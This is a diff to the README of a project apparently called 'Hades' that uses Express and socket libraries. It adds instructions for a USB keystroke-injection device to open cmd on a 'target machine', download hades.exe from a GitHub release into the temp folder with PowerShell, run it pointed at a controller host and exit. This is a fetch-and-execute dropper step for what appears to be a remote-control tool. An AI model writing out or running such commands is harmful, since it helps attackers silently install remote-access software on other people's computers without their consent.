@@ -37,3 +37,22 @@ Here is the list of used libraries, you can download all of them using `npm inst
 - `Body-parser` - Used to parse responses.
 - `WSS` - Used for socket connections.
 - `Express` - Used to setup servers.
+
+## Run from command line
+This can be usefull for exemple if you want to use a USB stick which simulate a keyboard when you plug it into a machine.
+
+### Window
+Copy and paste the commands in a cmd on a target machine
+
+```bash
+cd %TEMP%
+powershell wget "https://github.com/AntoineBRTL/Hades/releases/download/1.0/hades.exe" -outfile "h.exe"
+h.exe -c localhost
+exit
+```
+
+### Linux 
+Not done yet
+
+### MacOS
+Not done yet
